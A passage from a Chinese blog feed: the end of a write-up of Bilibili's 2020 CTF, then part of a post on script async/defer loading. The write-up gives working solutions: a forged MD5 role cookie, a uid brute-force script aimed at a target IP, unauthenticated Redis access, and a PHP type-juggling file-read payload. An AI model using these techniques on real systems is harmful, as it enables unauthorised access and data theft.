<code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 